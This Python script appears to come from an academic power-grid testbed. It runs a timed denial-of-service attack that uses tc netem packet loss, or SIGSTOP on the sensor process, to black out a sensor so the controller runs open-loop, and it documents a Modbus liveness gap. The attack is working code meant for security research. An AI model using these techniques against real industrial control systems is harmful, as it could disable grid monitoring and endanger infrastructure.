"""
attacks/dos.py — tc/netem Packet-Loss DoS Attack (Sensor Blackout)

Mechanism
---------
Uses tc netem `loss X%` to drop the overwhelming majority of packets on
the sensor host's network interface for a configured attack window,
simulating complete loss of sensor visibility from the controller's
perspective.

Fallback: if tc/netem is unavailable or fails, the script sends SIGSTOP to
the sensor process (PID supplied via --sensor-pid) to pause it, then
SIGCONT to resume it after the window — achieving the same blackout effect.

This script MUST run inside the sensor host's network namespace so the tc
command targets the correct virtual interface. The run script launches it
via `sensor.popen(...)`.

Academic framing (for writeup)
-------------------------------
By dropping nearly all sensor-to-controller packets, the controller's
Modbus read calls fail silently. Because Modbus/TCP defines no built-in
liveness signal or heartbeat, "sensor unreachable" is indistinguishable
from "frequency nominally within band" at the controller. The controller's
existing `except: pass` handler (controller_device.py L80-82) silently
retains the last setpoint, meaning the grid runs open-loop with no
corrective action for the entire blackout window. This demonstrates the
documented ICS risk of unauthenticated, stateless polling: there is no
authenticated channel to declare sensor health.

Known gap (not patched per Phase 3 constraints)
------------------------------------------------
controller_device.py does not distinguish a read timeout/failure from a
quiet "no-action" cycle (L80-82). This is flagged here as a secondary
architectural finding for the writeup — the controller should maintain a
last-seen-timestamp and alarm if no valid reading arrives within N cycles.
This gap is NOT patched in this phase per the project constraints.

Usage (launched inside sensor namespace via run_dos.py):
    python attacks/dos.py \\
        --interface    sensor-eth0 \\
        --loss-pct     90 \\
        --attack-start  60 \\
        --attack-duration 120 \\
        [--sensor-pid  <PID>] \\
        [--db-path powergrid_db.sqlite]
"""

import sys
import os
import time
import signal
import argparse
import subprocess
import sqlite3
from typing import Optional


# ──────────────────────────────────────────────────────────────────────────────
# Shared-state helper
# ──────────────────────────────────────────────────────────────────────────────

def _set_attack_flag(db_path: str, value: str) -> None:
    """Write ATTACK_ACTIVE tag to shared SQLite state DB."""
    try:
        conn = sqlite3.connect(db_path, timeout=5)
        conn.execute(
            "UPDATE powergrid SET value=? WHERE name='ATTACK_ACTIVE' AND pid=1",
            (value,)
        )
        conn.commit()
        conn.close()
    except Exception as exc:
        print(f"[dos] WARNING: ATTACK_ACTIVE update failed: {exc}", file=sys.stderr)


# ──────────────────────────────────────────────────────────────────────────────
# tc/netem helpers
# ──────────────────────────────────────────────────────────────────────────────

def _tc_add_loss(interface: str, loss_pct: int) -> bool:
    """Apply netem packet-loss qdisc on *interface*. Returns True on success."""
    cmd = [
        'tc', 'qdisc', 'add', 'dev', interface,
        'root', 'netem', 'loss', f'{loss_pct}%'
    ]
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[dos] WARNING: tc add loss failed (rc={result.returncode}): "
              f"{result.stderr.strip()}", file=sys.stderr)
        return False
    print(f"[dos] tc netem loss {loss_pct}% applied on {interface}")
    return True


def _tc_del_loss(interface: str) -> None:
    """Remove the root qdisc from *interface*."""
    cmd = ['tc', 'qdisc', 'del', 'dev', interface, 'root']
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[dos] WARNING: tc del failed (rc={result.returncode}): "
              f"{result.stderr.strip()}", file=sys.stderr)
    else:
        print(f"[dos] Removed netem qdisc from {interface}")


# ──────────────────────────────────────────────────────────────────────────────
# SIGSTOP/SIGCONT fallback helpers
# ──────────────────────────────────────────────────────────────────────────────

def _sigstop_process(pid: int) -> None:
    """Send SIGSTOP to pause the sensor process (fallback if tc unavailable)."""
    try:
        os.kill(pid, signal.SIGSTOP)
        print(f"[dos] Sent SIGSTOP to sensor PID {pid} (SIGSTOP fallback active)")
    except Exception as exc:
        print(f"[dos] SIGSTOP failed for PID {pid}: {exc}", file=sys.stderr)


def _sigcont_process(pid: int) -> None:
    """Send SIGCONT to resume the sensor process."""
    try:
        os.kill(pid, signal.SIGCONT)
        print(f"[dos] Sent SIGCONT to sensor PID {pid} — sensor resumed")
    except Exception as exc:
        print(f"[dos] SIGCONT failed for PID {pid}: {exc}", file=sys.stderr)


# ──────────────────────────────────────────────────────────────────────────────
# Attack logic
# ──────────────────────────────────────────────────────────────────────────────

def run_dos(
    interface: str,
    loss_pct: int,
    attack_start: float,
    attack_duration: float,
    db_path: str,
    sensor_pid: Optional[int],
) -> None:
    """Sleep → apply tc loss (or SIGSTOP) → hold window → clean up."""

    print(f"[dos] ── Configuration ───────────────────────────────────────")
    print(f"[dos]   Interface    : {interface}")
    print(f"[dos]   Packet loss  : {loss_pct}%")
    print(f"[dos]   Attack window: t={attack_start:.1f}s → "
          f"t={attack_start + attack_duration:.1f}s  "
          f"(duration {attack_duration:.0f}s)")
    if sensor_pid:
        print(f"[dos]   Fallback PID : {sensor_pid} (SIGSTOP if tc fails)")
    print(f"[dos]   State DB     : {db_path}")
    print(f"[dos] ─────────────────────────────────────────────────────────")

    # ── Pre-attack sleep ─────────────────────────────────────────────────────
    t0 = time.monotonic()
    wait = attack_start - (time.monotonic() - t0)
    if wait > 0:
        print(f"[dos] Waiting {wait:.1f}s before attack window opens...")
        time.sleep(wait)

    # ── Apply packet loss ────────────────────────────────────────────────────
    tc_ok = _tc_add_loss(interface, loss_pct)
    using_sigstop = False

    if not tc_ok and sensor_pid is not None:
        print(f"[dos] tc unavailable — falling back to SIGSTOP on PID {sensor_pid}")
        _sigstop_process(sensor_pid)
        using_sigstop = True
    elif not tc_ok:
        print("[dos] WARNING: tc failed and no --sensor-pid provided. "
              "Attack flag will still be set but no actual disruption applied.",
              file=sys.stderr)

    _set_attack_flag(db_path, '1')
    print(f"[dos] ATTACK_ACTIVE = True  ← attack window open")

    # ── Hold for attack duration ─────────────────────────────────────────────
    try:
        time.sleep(attack_duration)
    finally:
        # ── Cleanup ──────────────────────────────────────────────────────────
        if tc_ok:
            _tc_del_loss(interface)
        if using_sigstop and sensor_pid is not None:
            _sigcont_process(sensor_pid)
        _set_attack_flag(db_path, '0')
        print(f"[dos] ATTACK_ACTIVE = False ← attack window closed")


# ──────────────────────────────────────────────────────────────────────────────
# CLI entrypoint
# ──────────────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='tc/netem packet-loss DoS attack — Power Grid CPS Testbed Phase 3',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument('--interface',
                        default='sensor-eth0',
                        help='Network interface inside sensor namespace to shape')
    parser.add_argument('--loss-pct',
                        type=int, default=90,
                        help='Packet drop percentage applied by tc netem (0-100)')
    parser.add_argument('--attack-start',
                        type=float, default=60.0,
                        help='Seconds after script launch to open attack window')
    parser.add_argument('--attack-duration',
                        type=float, default=120.0,
                        help='Duration of active attack window (s)')
    parser.add_argument('--sensor-pid',
                        type=int, default=None,
                        help='Sensor process PID for SIGSTOP fallback if tc fails')
    parser.add_argument('--db-path',
                        default='powergrid_db.sqlite',
                        help='Path to shared SQLite state database')
    args = parser.parse_args()

    run_dos(
        interface=args.interface,
        loss_pct=args.loss_pct,
        attack_start=args.attack_start,
        attack_duration=args.attack_duration,
        db_path=args.db_path,
        sensor_pid=args.sensor_pid,
    )
